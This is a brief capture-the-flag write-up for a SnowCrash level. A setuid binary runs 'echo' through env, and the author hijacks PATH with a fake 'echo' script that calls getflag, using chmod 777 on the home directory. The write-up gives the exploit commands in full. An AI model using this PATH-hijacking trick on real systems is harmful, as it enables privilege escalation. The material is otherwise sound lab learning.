# Find the password of Flag03

## First check :
Home directory : \[✓\] not empty.

This time, we found a binary file which we run:

> ./level03
> Exploit me


## Exploit it.

The first thing that came us in mind is to hexdump the binary file.
#### result:
> /usr/bin/env echo Exploit me

The vulnerability is then in the `echo` which we exploit by injecting the `getflag` command in our *homemade echo*.
#### (by homemade, we mean the /home/... obviously **~**)


```
chmod 777 .
echo 'getflag' > echo
chmod +x echo
export PATH=/home/user/level03/:$PATH
```

We run again the `./level03` aaaand..

## TADAAAAAAA, It's ... 
[The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level03/flag)

_tobecontinued_